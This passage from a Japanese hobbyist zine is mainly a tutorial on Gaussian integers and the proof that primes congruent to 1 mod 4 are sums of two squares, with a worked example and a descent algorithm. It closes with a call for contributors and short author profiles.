1型の素数はすべて登場している。
　そこで、大胆にも次の予想を立ててみる。

[予想]「p：2または1型の素数」⇔「∃x,y∈Z s.t. p=x^2+y^2」

　素数pがp=x^2+y^2と表されるとき、p=y^2+x^2でもあるから、x≧yとしても一般
性は失われない。
　それではpが2または1型の素数を満たす具体的な数値を考えて、このpがx^2+y^2、
即ち平方の和で表現できることを確認する。

 p | x^2+y^2
---+---------
 2 | 1^2+1^2
 5 | 2^2+1^2
13 | 3^2+2^2
17 | 4^2+1^2
29 | 5^2+2^2
37 | 6^2+1^2
41 | 5^2+4^2

　pが50以下のときには必ず予想が成り立つことがわかった。この予想が成り立つ
ことを示すことが今回の講座のメインテーマである。


### 0x03 ガウスの整数

　2または1型の素数が2つの平方数の和で表現できることを証明するためには、
ガウスの整数という概念を用いた方がわかりやすいため、ここでガウスの整数を
定義する。

　ガウスの整数とは、α=a+bi(a,b∈Z)という形の数のことである。Zは整数の集
合、iは虚数である。このガウスの整数全体の集合をZ[i]を書く。つまり、Z[i]は
次のように定義される。

Z[i]={α|α=a+bi, a,b∈Z}

　このZ[i]は環の定義を満たすので、環であることを強調するときはガウスの整

数環と呼ぶ。
　また、Z[i]はZやC（複素数の集合）と比較すると、Z⊂Z[i]⊂Cという関係を持つ。
　Z[i]を一般化したZ[√m],m∈ZやQ[√m]などを考えることもできるが、今回の目
的は素数の2平方和表現を示すことなので、m=-1のときのガウスの整数Z[√-1]=
Z[i]に注目する。

　Z[i]の世界にも素数を定義できる。詳細は0x04で定義する。
　Z上の素数とZ[i]上の素数を区別するために、Z上の素数を「有理素数」と呼ぶ
ことにする。単に素数と呼ぶときは、Z[i]上の素数である（もしZ[i]の存在がま
ったく関係ない話のときはZ上の素数を意味する）。よって、今回の目的の「2ま
たは1型の素数が2つの平方数の和で表現できること」というのは「2または1型の
有理素数が2つの平方数の和で表現できること」と言い換えることができる。

### 0x04 Z[i]上の単数・同伴数・素数

　Z[i]上の素数を定義するために、単数・同伴数という概念が必要なので、最初
に単数・同伴数を定義してから、素数を定義する。

　Z上の有理整数±1はすべての整数の約数であった。Z[i]上のすべての整数の約
数を単数と呼ぶ。
　Z[i]上でも±1はすべての整数の約数なので、±1は単数である。この他にも単
数があるかどうかを調べる。
　ここで、単数をεとする。単数の定義よりεは1の約数であるので、1/ε=ε'
（ε'は整数）となる。次のように変形できる。

1/ε=ε'
εε'=1　←(*)
1/ε'=ε

　よって、ε'も単数になり、ε'は整数である。そこで、(*)の両辺をノルムにす
ると次のようになる（複素数α=a+bi, a,b∈Rとしたときに、αのノルムとはN(α)
=a^2+b^2=α・‾α=|α|^2と定義されるものである。ガウスの整数のノルムは有
理整数となる）。

N(εε')=N(1)
N(ε)N(ε')=1
N(ε)=N(ε')=1
a^2+b^2=1　（∵ε=a+biとおいた）
(a,b)=(1,0),(0,1),(-1,0),(0,-1)
∴ε=(1,i,-1,i)

　ゆえに、Z[i]の単数は1,-1,i,-iの4つと判明した。
　ガウスの整数は複素平面上では整数座標の点（格子点）に対応しており、Z[i]
の単数を複素平面上にプロットすると次のようになる。4つの単数の点を線分で結
ぶと正方形になる。

        Im
         |
         |
         |
         . i
     -1  |  1
------.--+--.------- Re
         |
         . -i
         |
         |
         |

　次に同伴数を定義する。
　α,β∈Z[i]とし、α/βが単数であるとき、αとβは同伴であるという（αは
βの同伴数）。
　αの同伴数はα,-α,iα,-iαの4つ存在する。つまり、対象の整数自身に単数
の4つの値を掛けた4つの整数が、対象の整数の同伴数ということになる。
　複素数にiを掛けると、複素平面上で90度反時計周りに回転した値になる。例
えば、第1象限にαがあるとすれば、iαは第2象限にある。iを4回掛けると、90
度×4＝360度回転するので、元の値の場所に戻ってくる。
　αの4つの同伴数を複素平面上にプロットすると次のようになる。この4つの同
伴数の点を線分で結んでも正方形になる。

        Im
         |
         |
         |
    iα. |  
         |  .α
---------+---------- Re
   -α.  |
         | .-iα
         |
         |
         |

　任意の整数α∈Z[i]に対して、単数とα自身とαの同伴数を約数として持つ。
そのため、これらを自明な約数という。一方、それら以外の約数を真の約数とい
う。

　これで素数を定義する準備ができた。
　0でも単数でもない整数α∈Z[i]が真の約数を持たないときに、αを素数とい
う。そして、0でも単数でも素数でもない整数を合成数という。

　Zで素数であっても、Z[i]では素数ではない（合成数である）場合もある。例
えば、整数2がそうである。これは次のように確認できる。
　整数2が2つの整数β,γ∈Z[i]（ただしβ,γは単数ではない）の積に分解でき
たとする。

2=βγ
⇒N(2)=N(βγ)　（∵両辺にノルムを取る）
2^2=N(β)N(γ)
4=N(β)N(γ)
N(β)=N(γ)=2

　β=c+diとすると、N(β)=c^2+d^2=2なので、c=±1,d=±1となる。
　つまり、β=1+i,1-i,-1+i,-1-iである。
　同様に、γ=1+i,1-i,-1+i,-1-iである。

　β=1+i,γ=1-iのとき、2=βγ=(1+i)(1-i)=(1+i){-i(1+i)}=-i(1+i)^2となる。
つまり、2は真の約数として1+iを持つ。
　ゆえに、2はZ[i]の素数ではない。　◇


### 0x04 有理素数の2平方和表現

　「2または1型の有理素数が2つの平方数の和で表現できること」を示すために、
次の補題を利用する。

[補題]
p：有理奇素数とする。
(1)p：3型の有理素数⇒p：Z[i]の素数
(2)p：1型の有理素数⇒「∃π∈Z[i]かつ素数 s.t. N(π)=p」

　Z[i]上の素数はすでに定義済みなので、この補題の意味はわかると思う。今回
はこの補題の(2)を証明に用いる。
　それではこの補題が成り立つと仮定して、目的の定理を証明する。

[定理]
(1)有理素数2は2つの平方数の和2=1^2+1^2で表せる。
(2)「有理奇素数pは2つの平方数の和p=a^2+b^2に表せる」⇔「p：1型の素数」

　(1)は自明なので、(2)を証明する。

[1]⇒を示す。
　pが有理奇素数より、a^2かb^2のどちらかは奇数になる。つまり、aかbのどち
らかは奇数になる。
　ここでaを奇数、bを偶数とする。a=2m+1,b=2n(m,n∈Z)とおく。

p=a^2+b^2
=(2m+1)^2+(2n)^2
=4m^2+4m+1+4n^2
≡1 (mod 4)

[2]←を示す。
　pが1型の有理素数のとき、補題の(2)より「∃π∈Z[i]かつ素数 s.t. N(π)=p」
が成り立つ。

p=N(π)
=π・‾π
=(a+ib)(a-ib)　（π=a+ibとおいた）
=a^2+b^2　□

　具体的な数値例で確かめてみる。p=13という有理素数を2つの平方の和で表現し
たいとする。

　第1補充法則より、(-1/13)=1が成り立つ。つまり、-1∈QR_13である。即ち、
x^2≡-1 (mod 13)を満たすxが存在する。即ち、x^2+1≡0 (mod 13)を満たすxが
存在する。

　また、第2補充法則より、(2/13)=-1が成り立つ。またオイラー基準より(2/13)
=2^{(13-1)/2}=2^6 (mod 13)が成り立つ。この2つの式をまとめると2^6≡-1 
(mod 13)となり、次のように展開できる。

2^6≡-1 (mod 13)
⇔8^2≡-1 (mod 13)
⇔8^2+1≡0 (mod 13)　←x=8のときにx^2+1≡0 (mod 13)を満たしている。
⇔8^2+1^2≡0 (mod 13)
⇔8^2+1^2=13・5　←(*)

　今p=13で考えているため、上記の式の右辺の因数5が消えてくれれば、目的を果
たしたことになる。
　mod 5の世界で8と1と一致する数を考える。ただし、範囲は(0,5)ではなく、
(-5/2,5/2)とする。

  - 8≡-2 (mod 5),-5/2＜-2＜5/2
  - 1≡1 (mod 5),-5/2＜1＜5/2

　右辺の-2と1を選び、(-2)^2+1^2=5が成り立つ。　←(**)

　(*)(**)の各々の両辺を掛け合わせると、次のようになる。

(8^2+1^2)((-2)^2+1^2)=13・5^2
⇔10^2+15^2=13・5^2　（∵(a^2+b^2)(c^2+d^2)=(ad-bc)^2+(ac+bd)^2）
⇔2^2+3^2=13　（∵両辺を5^2で割った）
⇔2^2+3^2=p　◇


### 0x05 有理素数の2平方和表現のアルゴリズム

　有理素数が与えられたときに、有理素数の2平方和表現を得るためのアルゴリズ
ムを紹介する。アルゴリズムの流れはp=13のときの実例の流れと基本的に同じで
ある。

　pを1型の有理素数とする。
　第1補充法則より、x^2+1≡0 (mod p)を満たすx（1＜x＜p/2）が存在する。

x^2+1≡0 (mod p)
⇔x^2+1^2≡0 (mod p)
⇔x^2+1^2=pk (k＜p)　←(*)

　ここでkが邪魔だから消したい。
　もし「x^2+y^2=pk (k＞1）（←(*)）に対して、z^2+w^2=pt (t＜k)を満たすz,
wが存在する」ならば、これを繰り返すことにより新たな邪魔な係数が小さくな
っていき、いつかは邪魔な係数が消えて、○^2+△^2=pの形になることが期待で
きる（これを無限降下法という）。
　そこで、「x^2+y^2=pk (k＞1）（←(*)）に対して、z^2+w^2=pt (t＜k)を満た
すz,wが存在する」を示す。

  - x≡u (mod k),-k/2＜u≦k/2　←(i)
  - y≡v (mod k),-k/2＜v≦k/2　←(ii)

　上記を満たすu,vは、次を満たす。

u^2+v^2≡x^2+y^2 (mod k)
⇔u^2+v^2≡0 (mod k)　（∵(*)）
⇒u^2+v^2≦(k^2)/2　（∵(i),(ii)）
⇔u^2+v^2=kt, t≦k/2　←(**)

　(*)(**)を各々の辺を掛け合わせると、次のようになる。

(x^2+y^2)(u^2+v^2)=pk^2t
⇔(xv-yu)^2+(xu+yv)^2=pk^2t　（∵(a^2+b^2)(c^2+d^2)=(ad-bc)^2+(ac+bd)^2）
⇔k^2z^2+k^2w^2=pk^2t　（∵xv-yu≡xy-yx≡0 (mod k)より、xv-yu=kzとおいた。
同様にxu+yv=kwとおいた）
⇔z^2+w^2=pt, t≦k/2　□

　p=13のときは(*)を1度だけ適用しただけで、2平方和に表現できた。pが大きく
なっても、(*)を繰り返して実行すればいつかは2平方和に表現できる。


### 0x07 おわりに

　今回は有理素数は2平方和で表現できることを示すためにガウスの整数Z[i]を
導入した。
　Zでは素因数分解の一意性が成り立つが、Z[i]でも素因数分解の一意性が成り
立つ。興味のある方は整数論の本を参考にして欲しい。

　ではでは。



***

## 第4章: お知らせ

***

- Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
います。
　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
味の解説などでも構いません。
　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
る範囲で構いません。気軽に声をかけてください。

- Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
書かれていますので、参考にしてください。

http://wizardbible.org/wbQandA.html

- Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。


***

## 第5章: 著者プロフィール

***

### unya
●Job: ネットワークエンジニア
●Web: http://routehack.org/
●Mail: unya@routehack.org
●Comment:
　お久しぶりです。無事に更生して元気に暮らしているunyaです。
　最近はもっぱら、年明けから飼い始めたメスのミニチュアダックスに心を奪わ
れています。
　今年はルーティング周りのセキュリティを攻めつつ、何かおもしろいネタがな
いか探そうと思います。
　ネタになるようなものがあればWBへフィードバックしますね。
　ではでは。


### 黒林檎
●Web: http://ameblo.jp/r00tapple/
●Mail: aiceteasun@gmail.com
●Comment: 初投稿です。
　頑張って継続的に投稿できるよう頑張ります。


### IPUSIRON
●Job: プログラマー
●Web: http://akademeia.info
●Mail: ipusiron@gmail.com
●Comment:
　今回のWBの記事は、錠前登場以前から古代の錠前の登場までの話にしようと思
っていましたが、書いていくうちにもっと突き詰めたいと思ったために今回は保
留しました。その代わりに久しぶりの暗号講座にしました（といっても内容は数
学ネタですが…）。
　次回の記事のネタはまだ確定していませんが、現在の興味が大きく変動しない
限り、デジタル回路か暗号講座の続きになりそうです。
